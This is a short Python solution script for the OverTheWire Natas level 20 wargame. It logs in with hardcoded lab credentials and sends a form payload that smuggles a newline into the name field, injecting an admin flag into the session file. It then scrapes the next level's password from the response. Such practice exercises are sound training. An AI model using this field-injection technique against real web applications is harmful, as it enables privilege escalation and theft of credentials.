import re, requests
USER = 'natas20'
PASS = 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw'
URL = f'http://{USER}.natas.labs.overthewire.org/index.php?debug'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
header = {"Content-Type": "application/x-www-form-urlencoded"}
payload = 'name=admin%0aadmin+1'
burp = {"http": "http://127.0.0.1:8080"}

session = requests.Session()

for r in range(0,2):
    request = session.post(url=URL, auth=auth_basic, headers=header, data=payload)
    response_http = request.text
    if 'Username: natas21' in response_http:
        flag = str(re.search(r'Password:[^:]+<', response_http))
        password = flag.split(':')[1][1: -8]
        print('The password for the natas21 is:', password)